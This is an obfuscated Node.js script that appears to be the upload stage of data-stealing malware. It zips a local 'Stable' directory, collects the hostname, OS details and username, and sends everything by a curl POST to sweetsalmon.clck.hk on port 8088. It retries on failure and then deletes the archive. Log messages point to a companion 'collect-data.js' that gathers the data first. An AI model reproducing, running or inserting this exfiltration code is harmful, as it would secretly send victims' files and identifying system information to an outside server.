const _0x5c5b58=_0x4e18;(function(_0x2e76c1,_0x1df3f0){const _0x294a78=_0x4e18,_0x4be1af=_0x2e76c1();while(!![]){try{const _0x2684fb=parseInt(_0x294a78(0x9b))/0x1+-parseInt(_0x294a78(0x8e))/0x2*(parseInt(_0x294a78(0xc9))/0x3)+parseInt(_0x294a78(0x9e))/0x4*(parseInt(_0x294a78(0xa8))/0x5)+-parseInt(_0x294a78(0xd5))/0x6*(parseInt(_0x294a78(0xcf))/0x7)+parseInt(_0x294a78(0xdb))/0x8+-parseInt(_0x294a78(0xa0))/0x9*(parseInt(_0x294a78(0xae))/0xa)+-parseInt(_0x294a78(0xde))/0xb;if(_0x2684fb===_0x1df3f0)break;else _0x4be1af['push'](_0x4be1af['shift']());}catch(_0x3e503a){_0x4be1af['push'](_0x4be1af['shift']());}}}(_0x222a,0x79e2f));const fs=require('fs'),os=require('os'),path=require(_0x5c5b58(0xa4)),{exec,execSync}=require(_0x5c5b58(0xc7)),dns=require(_0x5c5b58(0xa6)),CONFIG={'serverDomain':_0x5c5b58(0xc5),'serverPath':_0x5c5b58(0xbb),'serverPort':0x1f98,'apiKey':_0x5c5b58(0xc1),'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x927c0,'stableDir':_0x5c5b58(0xcd)};function log(_0x4a13b3,_0x250736=![]){const _0x58ed22=_0x5c5b58,_0x3f43ac=new Date()[_0x58ed22(0xdc)](),_0x43353b='['+_0x3f43ac+']\x20'+_0x4a13b3;_0x250736?console[_0x58ed22(0xbd)](_0x43353b):console[_0x58ed22(0x85)](_0x43353b);try{fs['appendFileSync'](_0x58ed22(0xd8),_0x43353b+'\x0a');}catch(_0xdaa625){console['error']('Error\x20writing\x20to\x20log:\x20'+_0xdaa625[_0x58ed22(0xb3)]);}}function formatFileSize(_0x3a7309){const _0x111e67=_0x5c5b58;if(_0x3a7309===0x0)return'0\x20Bytes';const _0x58b320=0x400,_0x4d96f3=[_0x111e67(0x98),'KB','MB','GB','TB'],_0x37e096=Math[_0x111e67(0xb2)](Math[_0x111e67(0x85)](_0x3a7309)/Math[_0x111e67(0x85)](_0x58b320));return parseFloat((_0x3a7309/Math['pow'](_0x58b320,_0x37e096))[_0x111e67(0xd9)](0x2))+'\x20'+_0x4d96f3[_0x37e096];}function getClientId(){const _0x37a522=_0x5c5b58;try{if(fs[_0x37a522(0xc8)](_0x37a522(0xe2)))return fs[_0x37a522(0xd6)](_0x37a522(0xe2),_0x37a522(0x89))[_0x37a522(0xa3)]();}catch(_0x21f921){log(_0x37a522(0x99)+_0x21f921[_0x37a522(0xb3)],!![]);}return Math[_0x37a522(0xb1)]()[_0x37a522(0xc6)](0x24)[_0x37a522(0xd7)](0x2,0xa);}async function createZipArchive(){const _0x2e62b8=_0x5c5b58;try{const _0x14bbb1=getClientId(),_0x3765a0=_0x14bbb1+_0x2e62b8(0x84);log(_0x2e62b8(0x8a)+_0x3765a0+_0x2e62b8(0xc3));if(!fs[_0x2e62b8(0xc8)](CONFIG['stableDir']))throw new Error('Directory\x20not\x20found:\x20'+CONFIG['stableDir']);const _0x1ddc5f=_0x2e62b8(0xc0)+_0x3765a0+'\x20'+CONFIG[_0x2e62b8(0xa9)]+_0x2e62b8(0xcb),_0x5b9cbf=execSync(_0x1ddc5f,{'encoding':_0x2e62b8(0x89)});if(fs[_0x2e62b8(0xc8)](_0x3765a0)){const _0x21970f=fs[_0x2e62b8(0x8c)](_0x3765a0);return log(_0x2e62b8(0xad)+_0x3765a0+'\x20('+formatFileSize(_0x21970f[_0x2e62b8(0xc4)])+')'),_0x3765a0;}else throw new Error('ZIP\x20archive\x20file\x20not\x20found\x20after\x20creation');}catch(_0x59e38c){return log(_0x2e62b8(0xbf)+_0x59e38c['message'],!![]),null;}}async function resolveDomainAndUpload(_0x2aa3ef,_0x191565=0x0){const _0x4b94aa=_0x5c5b58;log(_0x4b94aa(0xaa)+CONFIG[_0x4b94aa(0xda)]);try{const _0xf1ecbd=await new Promise((_0x5c420d,_0x40ba8b)=>{const _0x92959e=_0x4b94aa;dns[_0x92959e(0xb5)](CONFIG[_0x92959e(0xda)],(_0x2e0dab,_0x299dfe)=>{_0x2e0dab?_0x40ba8b(_0x2e0dab):_0x5c420d(_0x299dfe);});});return log('Domain\x20'+CONFIG[_0x4b94aa(0xda)]+_0x4b94aa(0xc2)+_0xf1ecbd),uploadFileWithCurl(_0x2aa3ef,_0xf1ecbd,_0x191565);}catch(_0x1b9c91){return log(_0x4b94aa(0xab)+_0x1b9c91['message'],!![]),_0x191565<CONFIG[_0x4b94aa(0xa2)]?(log(_0x4b94aa(0xbe)+CONFIG[_0x4b94aa(0xac)]/0x3e8+_0x4b94aa(0xe0)+(_0x191565+0x1)+_0x4b94aa(0xd1)+CONFIG[_0x4b94aa(0xa2)]+')'),await new Promise(_0x25bc36=>setTimeout(_0x25bc36,CONFIG['retryDelay'])),resolveDomainAndUpload(_0x2aa3ef,_0x191565+0x1)):(log('Maximum\x20retry\x20count\x20('+CONFIG['maxRetries']+_0x4b94aa(0x9f),!![]),![]);}}async function uploadFileWithCurl(_0x2c2d4a,_0x1cc5ec,_0x292937=0x0){const _0x1811da=_0x5c5b58;try{const _0x303c74=path['join'](process[_0x1811da(0xb7)](),_0x2c2d4a);if(!fs[_0x1811da(0xc8)](_0x303c74))return log(_0x1811da(0x95)+_0x303c74,!![]),![];const _0x5debd8=fs[_0x1811da(0x8c)](_0x303c74),_0x346f93=_0x5debd8[_0x1811da(0xc4)];if(_0x346f93===0x0)return log('File\x20is\x20empty',!![]),![];const _0x2df940={'hostname':os['hostname'](),'platform':os[_0x1811da(0xd0)](),'type':os[_0x1811da(0x86)](),'arch':os[_0x1811da(0xd2)](),'username':os[_0x1811da(0xcc)]()[_0x1811da(0xb8)],'id':getClientId()},_0x31fa1b=path[_0x1811da(0x94)](os['tmpdir'](),_0x1811da(0xbc));fs[_0x1811da(0x9d)](_0x31fa1b,JSON[_0x1811da(0xaf)](_0x2df940));const _0x277e45=CONFIG[_0x1811da(0xd4)]===0x1bb?_0x1811da(0xa1):'http';let _0x540890;_0x1cc5ec?_0x540890=_0x277e45+'://'+_0x1cc5ec+':'+CONFIG[_0x1811da(0xd4)]+CONFIG[_0x1811da(0x9a)]:_0x540890=_0x277e45+_0x1811da(0x8d)+CONFIG['serverDomain']+':'+CONFIG[_0x1811da(0xd4)]+CONFIG[_0x1811da(0x9a)];log(_0x1811da(0xa7)+_0x540890+_0x1811da(0x9c));const _0x5dc230=Date[_0x1811da(0xce)](),_0x1f2add=_0x1811da(0x91)+_0x540890+'\x22\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-H\x20\x22X-Client-Info:\x20$(cat\x20'+_0x31fa1b+')\x22\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-F\x20\x22file=@'+_0x303c74+_0x1811da(0xb0)+CONFIG['timeout']/0x3e8+_0x1811da(0xe3)+CONFIG['maxRetries']+'\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--retry-delay\x20'+CONFIG[_0x1811da(0xac)]/0x3e8+_0x1811da(0x93);return log(_0x1811da(0xe1)+_0x1f2add),new Promise((_0x4c7e25,_0x3c3b67)=>{exec(_0x1f2add,(_0x358943,_0x184480,_0x3379df)=>{const _0xd79c5e=_0x4e18;try{fs[_0xd79c5e(0x8f)](_0x31fa1b);}catch(_0x7ee9d3){}if(_0x358943){log(_0xd79c5e(0x88)+_0x358943[_0xd79c5e(0xb3)],!![]),_0x3c3b67(_0x358943);return;}const _0x59efa3=(Date[_0xd79c5e(0xce)]()-_0x5dc230)/0x3e8;log(_0xd79c5e(0xe4)+_0x59efa3[_0xd79c5e(0xd9)](0x2)+_0xd79c5e(0xd3));try{const _0x55190d=JSON[_0xd79c5e(0x90)](_0x184480);log(_0xd79c5e(0x92)+JSON[_0xd79c5e(0xaf)](_0x55190d)),_0x55190d[_0xd79c5e(0x97)]?_0x4c7e25(!![]):(log(_0xd79c5e(0x8b),!![]),_0x3c3b67(new Error(_0xd79c5e(0xba))));}catch(_0x15ef5e){log(_0xd79c5e(0xca)+_0x184480),_0x4c7e25(!![]);}});});}catch(_0xede511){return log(_0x1811da(0xb6)+_0xede511[_0x1811da(0xb3)],!![]),_0x292937<CONFIG[_0x1811da(0xa2)]?(log(_0x1811da(0xbe)+CONFIG[_0x1811da(0xac)]/0x3e8+_0x1811da(0xe0)+(_0x292937+0x1)+'\x20of\x20'+CONFIG[_0x1811da(0xa2)]+')'),await new Promise(_0x266a26=>setTimeout(_0x266a26,CONFIG[_0x1811da(0xac)])),uploadFileWithCurl(_0x2c2d4a,_0x1cc5ec,_0x292937+0x1)):(log('Maximum\x20retry\x20count\x20('+CONFIG[_0x1811da(0xa2)]+_0x1811da(0x9f),!![]),![]);}}function _0x4e18(_0x24acf0,_0x4a84bc){const _0x222a0e=_0x222a();return _0x4e18=function(_0x4e183b,_0x521e50){_0x4e183b=_0x4e183b-0x84;let _0x52aad4=_0x222a0e[_0x4e183b];return _0x52aad4;},_0x4e18(_0x24acf0,_0x4a84bc);}async function main(){const _0x23b0e7=_0x5c5b58;try{log(_0x23b0e7(0xb4));!fs[_0x23b0e7(0xc8)](CONFIG[_0x23b0e7(0xa9)])&&(log(_0x23b0e7(0x87)+CONFIG[_0x23b0e7(0xa9)],!![]),log('Make\x20sure\x20to\x20run\x20collect-data.js\x20first',!![]),process['exit'](0x1));const _0x1a0a83=await createZipArchive();!_0x1a0a83&&(log(_0x23b0e7(0xb9),!![]),process[_0x23b0e7(0xdd)](0x1));log('Starting\x20upload\x20process...');const _0x116c03=await resolveDomainAndUpload(_0x1a0a83);if(_0x116c03){log(_0x23b0e7(0xa5));try{fs[_0x23b0e7(0xc8)](_0x1a0a83)&&(fs[_0x23b0e7(0x8f)](_0x1a0a83),log(_0x23b0e7(0xdf)+_0x1a0a83));}catch(_0x42791c){log(_0x23b0e7(0x96)+_0x42791c[_0x23b0e7(0xb3)],!![]);}process[_0x23b0e7(0xdd)](0x0);}else log('Upload\x20failed',!![]),process[_0x23b0e7(0xdd)](0x1);}catch(_0x314066){log('Unexpected\x20error:\x20'+_0x314066['message'],!![]),process[_0x23b0e7(0xdd)](0x1);}}main();function _0x222a(){const _0xc46878=['platform','\x20of\x20','arch','\x20seconds','serverPort','124086CiRCjI','readFileSync','substring','uploader.log','toFixed','serverDomain','4775128ssZGOu','toISOString','exit','1525700mxicZq','ZIP\x20file\x20removed:\x20','\x20seconds...\x20(Attempt\x20','Executing\x20curl\x20command:\x20','client-id.txt','\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--retry\x20','Upload\x20completed\x20in\x20','.zip','log','type','Data\x20directory\x20not\x20found:\x20','Curl\x20execution\x20error:\x20','utf8','Creating\x20ZIP\x20archive:\x20','Upload\x20failed:\x20Server\x20returned\x20failure','statSync','://','2EneUCi','unlinkSync','parse','curl\x20-X\x20POST\x20\x22','Server\x20response:\x20','\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--progress-bar','join','File\x20not\x20found:\x20','Error\x20removing\x20ZIP\x20file:\x20','success','Bytes','Error\x20reading\x20client\x20ID:\x20','serverPath','670969qesfyn','\x20using\x20curl','writeFileSync','905188JfIgBS',')\x20reached,\x20giving\x20up','9QALJFv','https','maxRetries','trim','path','Upload\x20completed\x20successfully','dns','Starting\x20upload\x20to\x20','15GlfEBC','stableDir','Attempting\x20to\x20resolve\x20domain:\x20','DNS\x20resolution\x20error:\x20','retryDelay','ZIP\x20archive\x20created:\x20','2599490mbOqYs','stringify','\x22\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--connect-timeout\x2060\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--max-time\x20','random','floor','message','Starting\x20data\x20upload\x20process','lookup','Upload\x20failed:\x20','cwd','username','Failed\x20to\x20create\x20archive','Server\x20returned\x20failure','/api/files/upload','system-info.json','error','Retrying\x20in\x20','Failed\x20to\x20create\x20ZIP\x20archive:\x20','zip\x20-r\x20-1\x20','tJz4uRVCwl2eEwyPTudYP9iGRfgq','\x20resolved\x20to\x20','...','size','sweetsalmon.clck.hk','toString','child_process','existsSync','850974ncgima','Could\x20not\x20parse\x20server\x20response\x20as\x20JSON:\x20','\x20-x\x20\x22*.DS_Store\x22','userInfo','Stable','now','259OpZiQR'];_0x222a=function(){return _0xc46878;};return _0x222a();}
